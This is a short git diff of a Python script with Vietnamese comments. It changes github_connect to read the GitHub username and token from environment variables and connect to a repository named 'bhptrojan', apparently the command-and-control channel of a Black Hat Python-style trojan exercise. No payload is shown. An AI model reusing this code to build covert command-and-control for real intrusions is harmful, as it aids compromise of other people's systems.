@@ -7,16 +7,18 @@ import sys
 import threading
 import time
 from datetime import datetime
+import os
+from dotenv import load_dotenv
+
+load_dotenv()
 
 
 def github_connect():
     """Kết nối tới GitHub repository"""
-    with open('mytoken.txt') as f:
-        token = f.read()  # Đọc token xác thực từ file
-    user = 'lwd3c'  # Tên người dùng GitHub
+    user = os.getenv("USERNAME")  # Tên người dùng GitHub
     # Đăng nhập vào GitHub
     sess = github3.login(
-        token=token)
+        token=os.getenv("GITHUB_TOKEN"))
     return sess.repository(user, 'bhptrojan')  # Trả về repository
 
 
